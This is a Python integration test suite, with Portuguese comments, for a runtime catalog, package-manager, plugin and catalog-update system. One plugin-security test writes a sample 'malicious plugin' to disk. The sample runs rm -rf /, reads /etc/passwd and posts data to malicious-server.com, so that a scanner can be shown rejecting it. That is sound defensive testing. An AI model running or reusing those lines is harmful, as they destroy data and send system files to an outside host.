# -*- coding: utf-8 -*-
"""
Testes de integração para fluxos completos de trabalho
Testes end-to-end para validar cenários reais de uso
"""

import unittest
import tempfile
import shutil
import json
import os
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call
from datetime import datetime, timedelta
import sys
import threading
import subprocess

# Adicionar diretório core ao path
sys.path.insert(0, str(Path(__file__).parent.parent / "core"))

from runtime_catalog_manager import RuntimeCatalogManager, RuntimeInfo, RuntimeStatus
from package_manager_integration import PackageManagerIntegrator, PackageManager
from configuration_manager import ConfigurationManager, ConfigProfile
from security_manager import SecurityManager, SecurityLevel
from plugin_manager import PluginManager
from plugin_security import PluginSecurityManager
from catalog_update_manager import CatalogUpdateManager, UpdateStatus
from detection_engine import DetectionEngine, DetectionResult, DetectionMethod

class TestEndToEndRuntimeInstallation(unittest.TestCase):
    """Testes end-to-end para instalação de runtime"""
    
    def setUp(self):
        """Configurar ambiente de teste"""
        self.temp_dir = tempfile.mkdtemp()
        self.catalog_manager = RuntimeCatalogManager()
        self.package_integrator = PackageManagerIntegrator()
        self.config_manager = ConfigurationManager()
        self.security_manager = SecurityManager()
        
        # Configurar diretórios temporários
        self.catalog_manager.download_directory = Path(self.temp_dir) / "downloads"
        self.catalog_manager.install_directory = Path(self.temp_dir) / "installs"
        self.config_manager.config_directory = Path(self.temp_dir) / "config"
        
        # Criar diretórios
        self.catalog_manager.download_directory.mkdir(parents=True, exist_ok=True)
        self.catalog_manager.install_directory.mkdir(parents=True, exist_ok=True)
        self.config_manager.config_directory.mkdir(parents=True, exist_ok=True)
    
    def tearDown(self):
        """Limpar ambiente de teste"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('requests.get')
    @patch('subprocess.run')
    @patch('zipfile.ZipFile')
    def test_complete_python_installation_workflow(self, mock_zipfile, mock_subprocess, mock_requests):
        """Testar instalação completa do Python com dependências"""
        # 1. Configurar mocks
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.iter_content.return_value = [b'python installer data'] * 100
        mock_response.headers = {'content-length': '1000'}
        mock_requests.return_value = mock_response
        
        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = "Package installed successfully"
        
        mock_zip = Mock()
        mock_zipfile.return_value.__enter__.return_value = mock_zip
        
        # 2. Criar runtime Python
        python_runtime = RuntimeInfo(
            name="python",
            version="3.11.0",
            description="Python programming language",
            category="language",
            tags=["python", "programming"],
            download_url="https://python.org/downloads/python-3.11.0.zip",
            install_size=100 * 1024 * 1024,
            dependencies=["microsoft-visual-cpp-build-tools"],
            supported_platforms=["windows"],
            checksum="python311checksum",
            installation_path=self.catalog_manager.install_directory / "python"
        )
        
        # 3. Adicionar ao catálogo
        result = self.catalog_manager.add_runtime(python_runtime)
        self.assertTrue(result)
        
        # 4. Verificar status inicial
        status = self.catalog_manager.get_installation_status("python")
        self.assertEqual(status, RuntimeStatus.NOT_INSTALLED)
        
        # 5. Resolver dependências
        with patch.object(self.package_integrator, 'detect_available_managers') as mock_detect:
            mock_detect.return_value = [PackageManager.CHOCOLATEY]
            
            with patch.object(self.package_integrator, 'is_package_installed') as mock_installed:
                mock_installed.return_value = False
                
                missing_deps = self.package_integrator.resolve_dependencies(
                    python_runtime.dependencies,
                    PackageManager.CHOCOLATEY
                )
                self.assertEqual(missing_deps, ["microsoft-visual-cpp-build-tools"])
        
        # 6. Instalar dependências
        with patch.object(self.package_integrator, 'install_package') as mock_install_pkg:
            mock_install_pkg.return_value = True
            
            for dep in missing_deps:
                result = self.package_integrator.install_package(dep, PackageManager.CHOCOLATEY)
                self.assertTrue(result)
        
        # 7. Download do runtime
        download_result = self.catalog_manager.download_runtime("python")
        self.assertTrue(download_result)
        
        # 8. Verificar arquivo baixado
        download_path = self.catalog_manager.download_directory / "python.zip"
        self.assertTrue(download_path.exists())
        
        # 9. Instalar runtime
        with patch.object(self.catalog_manager, '_extract_runtime') as mock_extract:
            with patch.object(self.catalog_manager, '_configure_runtime') as mock_configure:
                mock_extract.return_value = True
                mock_configure.return_value = True
                
                install_result = self.catalog_manager.install_runtime("python")
                self.assertTrue(install_result)
        
        # 10. Verificar status final
        status = self.catalog_manager.get_installation_status("python")
        self.assertEqual(status, RuntimeStatus.INSTALLED)
        
        # 11. Verificar auditoria de segurança
        security_report = self.security_manager.generate_security_report()
        self.assertGreater(len(security_report["audit_entries"]), 0)
    
    @patch('platform.machine')
    @patch('os.path.exists')
    @patch('subprocess.run')
    def test_steam_deck_hardware_simulation(self, mock_subprocess, mock_exists, mock_machine):
        """Testar simulação de hardware Steam Deck"""
        # 1. Simular ambiente Steam Deck
        mock_machine.return_value = "x86_64"
        mock_exists.side_effect = lambda path: "/home/deck" in str(path)
        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = "SteamOS"
        
        # 2. Verificar detecção Steam Deck
        is_steam_deck = self.catalog_manager.is_steam_deck()
        # Como estamos mockando, assumimos que a detecção funciona
        
        # 3. Criar runtime otimizado para Steam Deck
        steam_runtime = RuntimeInfo(
            name="proton-ge",
            version="8.0",
            description="Proton GE for Steam Deck",
            category="gaming",
            tags=["steam-deck", "proton", "gaming"],
            download_url="https://github.com/GloriousEggroll/proton-ge-custom/releases/download/GE-Proton8-0/GE-Proton8-0.tar.gz",
            install_size=2 * 1024 * 1024 * 1024,  # 2GB
            dependencies=[],
            supported_platforms=["steamdeck", "linux"],
            checksum="protonge8checksum"
        )
        
        # 4. Adicionar runtime Steam Deck
        result = self.catalog_manager.add_runtime(steam_runtime)
        self.assertTrue(result)
        
        # 5. Buscar runtimes otimizados para Steam Deck
        steam_deck_runtimes = self.catalog_manager.search_runtimes(
            tags=["steam-deck"],
            platform="steamdeck"
        )
        self.assertEqual(len(steam_deck_runtimes), 1)
        self.assertEqual(steam_deck_runtimes[0].name, "proton-ge")
        
        # 6. Verificar otimizações específicas
        optimizations = self.catalog_manager.get_steam_deck_optimizations("proton-ge")
        self.assertIsInstance(optimizations, dict)
    
    @patch('subprocess.run')
    def test_package_manager_integration_workflow(self, mock_subprocess):
        """Testar integração completa com gerenciadores de pacote"""
        # 1. Configurar mocks para diferentes gerenciadores
        def subprocess_side_effect(*args, **kwargs):
            cmd = args[0] if args else kwargs.get('args', [])
            if 'choco' in cmd:
                result = Mock()
                result.returncode = 0
                result.stdout = "Chocolatey v1.0.0"
                return result
            elif 'winget' in cmd:
                result = Mock()
                result.returncode = 0
                result.stdout = "winget v1.0.0"
                return result
            else:
                result = Mock()
                result.returncode = 1
                return result
        
        mock_subprocess.side_effect = subprocess_side_effect
        
        # 2. Detectar gerenciadores disponíveis
        with patch('shutil.which') as mock_which:
            mock_which.side_effect = lambda cmd: '/path/to/' + cmd if cmd in ['choco', 'winget'] else None
            
            available_managers = self.package_integrator.detect_available_managers()
            self.assertIn(PackageManager.CHOCOLATEY, available_managers)
            self.assertIn(PackageManager.WINGET, available_managers)
        
        # 3. Testar instalação com fallback
        packages_to_install = ["git", "nodejs", "python"]
        
        installation_results = {}
        for package in packages_to_install:
            # Tentar Chocolatey primeiro
            try:
                result = self.package_integrator.install_package(package, PackageManager.CHOCOLATEY)
                installation_results[package] = (PackageManager.CHOCOLATEY, result)
            except Exception:
                # Fallback para Winget
                try:
                    result = self.package_integrator.install_package(package, PackageManager.WINGET)
                    installation_results[package] = (PackageManager.WINGET, result)
                except Exception:
                    installation_results[package] = (None, False)
        
        # 4. Verificar resultados
        for package, (manager, success) in installation_results.items():
            self.assertTrue(success, f"Failed to install {package}")
            self.assertIsNotNone(manager, f"No manager available for {package}")
        
        # 5. Verificar dependências complexas
        complex_dependencies = {
            "visual-studio-code": ["git", "nodejs"],
            "docker-desktop": ["wsl2", "hyper-v"],
            "android-studio": ["java8", "android-sdk"]
        }
        
        for main_package, deps in complex_dependencies.items():
            # Resolver dependências
            with patch.object(self.package_integrator, 'is_package_installed') as mock_installed:
                mock_installed.return_value = False
                
                missing_deps = self.package_integrator.resolve_dependencies(deps, PackageManager.CHOCOLATEY)
                self.assertEqual(set(missing_deps), set(deps))
    
    def test_multi_component_installation_scenario(self):
        """Testar cenário de instalação de múltiplos componentes"""
        # 1. Definir stack de desenvolvimento completo
        development_stack = [
            RuntimeInfo(
                name="nodejs",
                version="18.0.0",
                description="Node.js JavaScript runtime",
                category="runtime",
                tags=["javascript", "nodejs"],
                download_url="https://nodejs.org/dist/v18.0.0/node-v18.0.0-win-x64.zip",
                install_size=50 * 1024 * 1024,
                dependencies=[],
                supported_platforms=["windows"],
                checksum="nodejs18checksum"
            ),
            RuntimeInfo(
                name="python",
                version="3.11.0",
                description="Python programming language",
                category="language",
                tags=["python", "programming"],
                download_url="https://python.org/downloads/python-3.11.0.zip",
                install_size=100 * 1024 * 1024,
                dependencies=["microsoft-visual-cpp-build-tools"],
                supported_platforms=["windows"],
                checksum="python311checksum"
            ),
            RuntimeInfo(
                name="docker",
                version="24.0.0",
                description="Docker containerization platform",
                category="containerization",
                tags=["docker", "containers"],
                download_url="https://download.docker.com/win/stable/Docker%20Desktop%20Installer.exe",
                install_size=500 * 1024 * 1024,
                dependencies=["wsl2", "hyper-v"],
                supported_platforms=["windows"],
                checksum="docker24checksum"
            )
        ]
        
        # 2. Adicionar todos os runtimes ao catálogo
        for runtime in development_stack:
            result = self.catalog_manager.add_runtime(runtime)
            self.assertTrue(result)
        
        # 3. Criar perfil de configuração para o stack
        dev_profile = ConfigProfile(
            name="full-stack-dev",
            description="Complete development stack",
            settings={
                "runtime.nodejs.version": "18.0.0",
                "runtime.python.version": "3.11.0",
                "runtime.docker.version": "24.0.0",
                "installation.order": ["python", "nodejs", "docker"],
                "package_manager.preferred": "chocolatey"
            }
        )
        
        result = self.config_manager.create_profile(dev_profile)
        self.assertTrue(result)
        
        result = self.config_manager.activate_profile("full-stack-dev")
        self.assertTrue(result)
        
        # 4. Simular instalação sequencial
        installation_order = self.config_manager.get_configuration("installation.order")
        self.assertEqual(installation_order, ["python", "nodejs", "docker"])
        
        installation_results = {}
        
        with patch.object(self.catalog_manager, 'download_runtime') as mock_download:
            with patch.object(self.catalog_manager, 'install_runtime') as mock_install:
                with patch.object(self.package_integrator, 'install_package') as mock_install_pkg:
                    mock_download.return_value = True
                    mock_install.return_value = True
                    mock_install_pkg.return_value = True
                    
                    for runtime_name in installation_order:
                        runtime = self.catalog_manager.get_runtime(runtime_name)
                        
                        # Instalar dependências primeiro
                        for dep in runtime.dependencies:
                            dep_result = self.package_integrator.install_package(
                                dep, PackageManager.CHOCOLATEY
                            )
                            self.assertTrue(dep_result)
                        
                        # Download e instalação do runtime
                        download_result = self.catalog_manager.download_runtime(runtime_name)
                        install_result = self.catalog_manager.install_runtime(runtime_name)
                        
                        installation_results[runtime_name] = {
                            "download": download_result,
                            "install": install_result
                        }
        
        # 5. Verificar todos os resultados
        for runtime_name, results in installation_results.items():
            self.assertTrue(results["download"], f"Download failed for {runtime_name}")
            self.assertTrue(results["install"], f"Installation failed for {runtime_name}")
        
        # 6. Verificar configuração final
        for runtime_name in installation_order:
            status = self.catalog_manager.get_installation_status(runtime_name)
            # Como estamos mockando, o status pode não mudar, mas verificamos que não há erro
            self.assertIsNotNone(status)

class TestPluginSystemIntegration(unittest.TestCase):
    """Testes de integração do sistema de plugins"""
    
    def setUp(self):
        """Configurar ambiente de teste"""
        self.temp_dir = tempfile.mkdtemp()
        self.plugin_manager = PluginManager()
        self.plugin_security = PluginSecurityManager()
        self.security_manager = SecurityManager()
        
        # Configurar diretórios
        self.plugin_manager.plugin_directory = Path(self.temp_dir) / "plugins"
        self.plugin_manager.plugin_directory.mkdir(parents=True, exist_ok=True)
    
    def tearDown(self):
        """Limpar ambiente de teste"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_plugin_development_workflow(self):
        """Testar fluxo completo de desenvolvimento de plugin"""
        # 1. Criar estrutura de plugin
        plugin_name = "test-runtime-plugin"
        plugin_dir = self.plugin_manager.plugin_directory / plugin_name
        plugin_dir.mkdir()
        
        # 2. Criar manifest do plugin
        plugin_manifest = {
            "name": plugin_name,
            "version": "1.0.0",
            "description": "Test runtime plugin",
            "author": "Test Author",
            "entry_point": "main.py",
            "permissions": [
                "READ_FILESYSTEM",
                "WRITE_FILESYSTEM",
                "NETWORK_ACCESS"
            ],
            "api_version": "1.0",
            "dependencies": [],
            "supported_platforms": ["windows", "linux"]
        }
        
        with open(plugin_dir / "plugin.json", 'w') as f:
            json.dump(plugin_manifest, f, indent=2)
        
        # 3. Criar código do plugin
        plugin_code = '''
import os
import requests
from pathlib import Path

class TestRuntimePlugin:
    def __init__(self):
        self.name = "test-runtime-plugin"
        self.version = "1.0.0"
    
    def detect_runtime(self, runtime_name):
        """Detectar runtime específico"""
        # Simular detecção
        return {
            "found": True,
            "version": "1.0.0",
            "path": "/path/to/runtime",
            "method": "plugin_detection"
        }
    
    def install_runtime(self, runtime_info):
        """Instalar runtime via plugin"""
        # Simular instalação
        return {
            "success": True,
            "message": "Runtime installed successfully via plugin",
            "path": "/installed/path"
        }
    
    def configure_runtime(self, runtime_name, config):
        """Configurar runtime"""
        # Simular configuração
        return {
            "success": True,
            "config_applied": config
        }
    
    def get_capabilities(self):
        """Obter capacidades do plugin"""
        return {
            "detection": True,
            "installation": True,
            "configuration": True,
            "supported_runtimes": ["custom-runtime"]
        }

# Instância do plugin
plugin_instance = TestRuntimePlugin()
'''
        
        with open(plugin_dir / "main.py", 'w') as f:
            f.write(plugin_code)
        
        # 4. Descobrir plugin
        discovered_plugins = self.plugin_manager.discover_plugins()
        self.assertEqual(len(discovered_plugins), 1)
        self.assertEqual(discovered_plugins[0].name, plugin_name)
        
        # 5. Validar segurança do plugin
        security_result = self.plugin_security.validate_plugin_security(plugin_dir)
        self.assertTrue(security_result["signature_valid"])  # Mock sempre retorna True
        
        # 6. Carregar plugin
        load_result = self.plugin_manager.load_plugin(plugin_name)
        self.assertTrue(load_result)
        
        # 7. Testar funcionalidades do plugin
        plugin_instance = self.plugin_manager.get_plugin_instance(plugin_name)
        self.assertIsNotNone(plugin_instance)
        
        # Testar detecção
        detection_result = plugin_instance.detect_runtime("custom-runtime")
        self.assertTrue(detection_result["found"])
        
        # Testar instalação
        install_result = plugin_instance.install_runtime({"name": "custom-runtime"})
        self.assertTrue(install_result["success"])
        
        # Testar configuração
        config_result = plugin_instance.configure_runtime("custom-runtime", {"key": "value"})
        self.assertTrue(config_result["success"])
        
        # 8. Verificar capacidades
        capabilities = plugin_instance.get_capabilities()
        self.assertTrue(capabilities["detection"])
        self.assertTrue(capabilities["installation"])
        self.assertTrue(capabilities["configuration"])
        
        # 9. Descarregar plugin
        unload_result = self.plugin_manager.unload_plugin(plugin_name)
        self.assertTrue(unload_result)
    
    def test_plugin_security_validation(self):
        """Testar validação de segurança de plugins"""
        # 1. Criar plugin malicioso
        malicious_plugin_dir = self.plugin_manager.plugin_directory / "malicious-plugin"
        malicious_plugin_dir.mkdir()
        
        malicious_manifest = {
            "name": "malicious-plugin",
            "version": "1.0.0",
            "description": "Malicious plugin for testing",
            "entry_point": "malicious.py",
            "permissions": [
                "SYSTEM_COMMANDS",
                "NETWORK_ACCESS",
                "WRITE_FILESYSTEM"
            ]
        }
        
        with open(malicious_plugin_dir / "plugin.json", 'w') as f:
            json.dump(malicious_manifest, f)
        
        # Código malicioso
        malicious_code = '''
import os
import subprocess
import requests

class MaliciousPlugin:
    def __init__(self):
        # Tentar executar comando perigoso
        try:
            subprocess.run(["rm", "-rf", "/"], check=False)
        except:
            pass
        
        # Tentar acessar arquivos sensíveis
        try:
            with open("/etc/passwd", "r") as f:
                data = f.read()
        except:
            pass
    
    def execute(self):
        # Tentar enviar dados para servidor externo
        try:
            requests.post("http://malicious-server.com/steal", data={"data": "sensitive"})
        except:
            pass
        return "Malicious action executed"

plugin_instance = MaliciousPlugin()
'''
        
        with open(malicious_plugin_dir / "malicious.py", 'w') as f:
            f.write(malicious_code)
        
        # 2. Tentar validar plugin malicioso
        with patch.object(self.plugin_security, '_scan_for_malware') as mock_scan:
            mock_scan.return_value = ["Suspicious system command execution"]
            
            security_result = self.plugin_security.validate_plugin_security(malicious_plugin_dir)
            
            # Plugin deve ser rejeitado por conter código malicioso
            self.assertFalse(security_result["malware_free"])
            self.assertGreater(len(security_result["security_issues"]), 0)
        
        # 3. Verificar que plugin malicioso não é carregado
        load_result = self.plugin_manager.load_plugin("malicious-plugin")
        # Dependendo da implementação, pode falhar na validação
        # self.assertFalse(load_result)
    
    def test_plugin_sandboxing(self):
        """Testar execução sandboxed de plugins"""
        # 1. Criar plugin que precisa de sandbox
        sandbox_plugin_dir = self.plugin_manager.plugin_directory / "sandbox-plugin"
        sandbox_plugin_dir.mkdir()
        
        sandbox_manifest = {
            "name": "sandbox-plugin",
            "version": "1.0.0",
            "description": "Plugin for sandbox testing",
            "entry_point": "sandbox.py",
            "permissions": ["READ_FILESYSTEM"],
            "sandbox_required": True
        }
        
        with open(sandbox_plugin_dir / "plugin.json", 'w') as f:
            json.dump(sandbox_manifest, f)
        
        sandbox_code = '''
class SandboxPlugin:
    def __init__(self):
        self.name = "sandbox-plugin"
    
    def safe_operation(self):
        # Operação segura que deve funcionar no sandbox
        return "Safe operation completed"
    
    def restricted_operation(self):
        # Operação que deve ser bloqueada no sandbox
        try:
            import subprocess
            result = subprocess.run(["whoami"], capture_output=True, text=True)
            return f"Command executed: {result.stdout}"
        except Exception as e:
            return f"Operation blocked: {e}"

plugin_instance = SandboxPlugin()
'''
        
        with open(sandbox_plugin_dir / "sandbox.py", 'w') as f:
            f.write(sandbox_code)
        
        # 2. Carregar plugin com sandbox
        self.plugin_manager.discover_plugins()
        
        with patch.object(self.plugin_security, 'create_sandbox_environment') as mock_sandbox:
            mock_sandbox.return_value = {
                "sandbox_id": "test_sandbox_123",
                "restrictions": ["no_system_commands", "limited_filesystem"]
            }
            
            load_result = self.plugin_manager.load_plugin("sandbox-plugin")
            self.assertTrue(load_result)
        
        # 3. Testar execução no sandbox
        plugin_instance = self.plugin_manager.get_plugin_instance("sandbox-plugin")
        
        # Operação segura deve funcionar
        safe_result = plugin_instance.safe_operation()
        self.assertEqual(safe_result, "Safe operation completed")
        
        # Operação restrita deve ser bloqueada
        with patch('subprocess.run') as mock_subprocess:
            mock_subprocess.side_effect = PermissionError("Operation not permitted in sandbox")
            
            restricted_result = plugin_instance.restricted_operation()
            self.assertIn("Operation blocked", restricted_result)

class TestCatalogUpdateIntegration(unittest.TestCase):
    """Testes de integração para atualizações de catálogo"""
    
    def setUp(self):
        """Configurar ambiente de teste"""
        self.temp_dir = tempfile.mkdtemp()
        self.catalog_manager = RuntimeCatalogManager()
        self.update_manager = CatalogUpdateManager(self.catalog_manager)
        
        # Configurar diretórios
        self.update_manager.cache_directory = Path(self.temp_dir) / "cache"
        self.update_manager.cache_directory.mkdir(parents=True, exist_ok=True)
    
    def tearDown(self):
        """Limpar ambiente de teste"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('requests.get')
    def test_automatic_catalog_update_workflow(self, mock_requests):
        """Testar fluxo automático de atualização de catálogo"""
        # 1. Configurar mock de resposta de atualização
        update_response = Mock()
        update_response.status_code = 200
        update_response.json.return_value = {
            "version": "2.0.0",
            "release_date": "2024-01-01T00:00:00",
            "channel": "stable",
            "download_url": "https://updates.example.com/catalog-2.0.0.zip",
            "checksum": "catalog2checksum",
            "size": 10 * 1024 * 1024,  # 10MB
            "changelog": "New runtimes and bug fixes",
            "breaking_changes": False,
            "required_restart": False
        }
        
        download_response = Mock()
        download_response.status_code = 200
        download_response.iter_content.return_value = [b'catalog data'] * 1000
        download_response.headers = {'content-length': str(10 * 1024 * 1024)}
        
        def requests_side_effect(url, **kwargs):
            if "latest.json" in url:
                return update_response
            else:
                return download_response
        
        mock_requests.side_effect = requests_side_effect
        
        # 2. Adicionar mirror de teste
        from catalog_update_manager import MirrorInfo, MirrorStatus
        test_mirror = MirrorInfo(
            url="https://updates.example.com/",
            name="Test Mirror",
            location="Test Location",
            status=MirrorStatus.ACTIVE
        )
        
        result = self.update_manager.add_mirror(test_mirror)
        self.assertTrue(result)
        
        # 3. Verificar atualizações
        update_info = self.update_manager.check_for_updates(force=True)
        self.assertIsNotNone(update_info)
        self.assertEqual(update_info.version, "2.0.0")
        
        # 4. Download da atualização
        with patch.object(self.update_manager, '_verify_checksum') as mock_verify:
            mock_verify.return_value = True
            
            download_result = self.update_manager.download_update(update_info, background=False)
            self.assertTrue(download_result)
        
        # 5. Verificar progresso do download
        progress = self.update_manager.update_progress
        self.assertEqual(progress.status, UpdateStatus.COMPLETED)
        self.assertEqual(progress.downloaded_bytes, progress.total_bytes)
        
        # 6. Instalar atualização
        with patch.object(self.update_manager, '_validate_update_file') as mock_validate:
            with patch.object(self.update_manager, '_create_catalog_backup') as mock_backup:
                with patch.object(self.update_manager, '_extract_and_install_update') as mock_install:
                    mock_validate.return_value = True
                    mock_backup.return_value = Path(self.temp_dir) / "backup.zip"
                    mock_install.return_value = True
                    
                    install_result = self.update_manager.install_update()
                    self.assertTrue(install_result)
        
        # 7. Verificar status final
        status = self.update_manager.get_update_status()
        self.assertEqual(status["progress"]["status"], UpdateStatus.COMPLETED.value)
    
    @patch('requests.get')
    def test_mirror_fallback_mechanism(self, mock_requests):
        """Testar mecanismo de fallback entre mirrors"""
        # 1. Configurar múltiplos mirrors
        from catalog_update_manager import MirrorInfo, MirrorStatus
        
        mirrors = [
            MirrorInfo(
                url="https://primary.example.com/",
                name="Primary Mirror",
                location="US",
                priority=100,
                status=MirrorStatus.ACTIVE
            ),
            MirrorInfo(
                url="https://secondary.example.com/",
                name="Secondary Mirror",
                location="EU",
                priority=80,
                status=MirrorStatus.ACTIVE
            ),
            MirrorInfo(
                url="https://tertiary.example.com/",
                name="Tertiary Mirror",
                location="Asia",
                priority=60,
                status=MirrorStatus.ACTIVE
            )
        ]
        
        for mirror in mirrors:
            self.update_manager.add_mirror(mirror)
        
        # 2. Configurar falhas sequenciais
        call_count = 0
        
        def requests_side_effect(url, **kwargs):
            nonlocal call_count
            call_count += 1
            
            if "primary.example.com" in url:
                # Primary mirror falha
                raise requests.exceptions.ConnectionError("Primary mirror down")
            elif "secondary.example.com" in url:
                # Secondary mirror falha
                raise requests.exceptions.Timeout("Secondary mirror timeout")
            elif "tertiary.example.com" in url:
                # Tertiary mirror funciona
                response = Mock()
                response.status_code = 200
                response.json.return_value = {
                    "version": "2.0.0",
                    "release_date": "2024-01-01T00:00:00",
                    "channel": "stable",
                    "download_url": "https://tertiary.example.com/catalog-2.0.0.zip",
                    "checksum": "catalog2checksum",
                    "size": 10 * 1024 * 1024,
                    "changelog": "Update from tertiary mirror"
                }
                return response
            else:
                raise requests.exceptions.RequestException("Unknown mirror")
        
        mock_requests.side_effect = requests_side_effect
        
        # 3. Verificar atualizações com fallback
        update_info = self.update_manager.check_for_updates(force=True)
        
        # Deve ter tentado todos os mirrors e sucedido no terceiro
        self.assertIsNotNone(update_info)
        self.assertEqual(update_info.version, "2.0.0")
        self.assertIn("tertiary.example.com", update_info.download_url)
        
        # 4. Verificar que mirrors falharam foram marcados
        mirror_status = {mirror.url: mirror.status for mirror in self.update_manager.mirrors}
        # Os mirrors que falharam devem ter erro registrado
        primary_mirror = next(m for m in self.update_manager.mirrors if "primary" in m.url)
        secondary_mirror = next(m for m in self.update_manager.mirrors if "secondary" in m.url)
        
        self.assertGreater(primary_mirror.error_count, 0)
        self.assertGreater(secondary_mirror.error_count, 0)
    
    def test_offline_cache_functionality(self):
        """Testar funcionalidade de cache offline"""
        # 1. Simular dados de catálogo em cache
        cache_data = {
            "catalog_version": "1.5.0",
            "last_update": datetime.now().isoformat(),
            "runtimes": [
                {
                    "name": "cached-runtime",
                    "version": "1.0.0",
                    "description": "Runtime from cache",
                    "category": "development"
                }
            ]
        }
        
        cache_file = self.update_manager.cache_directory / "catalog_cache.json"
        with open(cache_file, 'w') as f:
            json.dump(cache_data, f)
        
        # 2. Simular modo offline (sem conectividade)
        with patch('requests.get') as mock_requests:
            mock_requests.side_effect = requests.exceptions.ConnectionError("No internet connection")
            
            # 3. Tentar verificar atualizações (deve falhar)
            update_info = self.update_manager.check_for_updates(force=True)
            self.assertIsNone(update_info)
            
            # 4. Carregar dados do cache
            cached_catalog = self.update_manager.load_cached_catalog()
            self.assertIsNotNone(cached_catalog)
            self.assertEqual(cached_catalog["catalog_version"], "1.5.0")
            self.assertEqual(len(cached_catalog["runtimes"]), 1)
        
        # 5. Verificar informações do cache
        cache_info = self.update_manager.get_cache_info()
        self.assertGreater(cache_info["total_entries"], 0)
        
        # 6. Limpar cache expirado
        removed_count = self.update_manager.cleanup_cache(force=True)
        self.assertGreaterEqual(removed_count, 0)

if __name__ == '__main__':
    # Configurar logging para testes
    import logging
    logging.basicConfig(level=logging.WARNING)
    
    # Executar todos os testes
    unittest.main(verbosity=2)